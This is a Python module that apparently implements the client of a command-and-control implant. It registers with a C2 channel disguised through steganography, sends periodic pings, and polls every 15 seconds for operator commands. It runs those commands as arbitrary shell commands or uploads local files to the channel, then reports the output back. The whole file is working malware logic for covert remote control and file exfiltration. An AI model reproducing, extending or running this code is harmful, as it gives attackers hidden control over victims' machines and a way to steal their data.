import os.path
import time

from ..ccchanel import log as cclog
from ..ccchanel.ccchanel_base import CCChanelBase
from ..ccchanel.log import log_append as cclog_append
from ..client import exec as cexec
from ..client import payloads as cpayload
from ..steno.steno_base import CCStenoBase


class CCClient(object):
    def __init__(self, ccchanel: CCChanelBase, steno_: CCStenoBase):
        self.ccchanel = ccchanel
        self.steno_base = steno_
        self.id = ''
        self.log_root = '/tmp'
        self.own_log = os.path.join(self.log_root, self.id)

    def is_registered(self):
        return self.id in self.ccchanel.list(self.log_root)

    def register(self):
        cclog.log_init(self.ccchanel, self.own_log, self.steno_base)

    def tell_alive(self):
        cclog.log_append(self.ccchanel, self.own_log, cpayload.alive_create(), self.steno_base)

    def get_command(self):
        log = cclog.log_read(self.ccchanel, self.own_log, self.steno_base)
        dones = []
        for log_entry in reversed(log):
            if log_entry.get('done', False):
                dones += [log_entry['done']['id']]
            elif log_entry.get('command', False) and log_entry['command']['id'] not in dones:
                return log_entry.get('command')
        return None

    def execute_command(self, local_path, *args):
        if local_path == 'upload':
            local_file_path = args[0]
            remote_file_path = os.path.join(self.log_root, local_file_path.replace('/', '_'))
            print(f"CLIENT: executing upload {local_file_path}")
            self.ccchanel.write(local_file_path, remote_file_path)
            return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
        else:
            return cexec.execute_arbitrary_command(local_path, *args)

    def log_append(self, payload):
        return cclog_append(self.ccchanel, self.own_log, payload, self.steno_base)

    def run(self):
        sleep_time = 15
        # id = cid.id()
        if not self.is_registered():
            self.register()
        self.tell_alive()
        while True:
            cmd = self.get_command()
            if cmd is not None:
                cmd_id = cmd['timestamp']
                exec_out = self.execute_command(cmd['kind'], *cmd['args']).decode()
                self.log_append(cpayload.done_create(cmd_id, exec_out))
            print(f"SLEEP {sleep_time}")
            time.sleep(sleep_time)
            self.log_append(cpayload.ping_create())
